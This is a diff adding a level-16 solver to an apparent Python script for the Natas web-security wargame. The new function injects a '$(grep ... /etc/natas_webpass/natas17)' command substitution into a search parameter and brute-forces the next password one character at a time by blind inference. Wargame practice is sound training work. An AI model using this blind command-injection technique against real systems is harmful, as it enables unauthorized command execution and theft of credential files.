@@ -329,6 +329,42 @@ def level15():
     else:
         print(" Password not found")
 
+def level16():
+    u = "/?needle="
+    bs = "$(grep ^"
+    be = " /etc/natas_webpass/natas17)unchristian"
+    print(" Blind injection {}{}{}".format(u, bs, be))
+    p = ""
+    c = True
+    s = string.ascii_letters + string.digits
+    print(" Bruteforce password: ", end="", flush=True)
+    while c:
+        for i in s:
+            r = urllib.parse.quote("{}{}{}{}".format(bs, p, i, be))
+            res, reg = rex(
+                "GET",
+                u + r,
+                "<pre>\n</pre>",
+                log=False,
+            )
+
+            if res.status != 200: return
+            if reg:
+                p += i
+                print(i, end="", flush=True)
+                break
+            else:
+                if i == s[-1]:
+                    c = False
+                    break
+
+    print()
+    if p != "":
+        if len(passwords) == level + 1: passwords.append(p)
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -338,7 +374,7 @@ levels = [
     level4, level5, level6, level7,
     level8, level9, level9, level11,
     level12, level12, level14, level15,
-    levelN, levelN, levelN, levelN,
+    level16, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
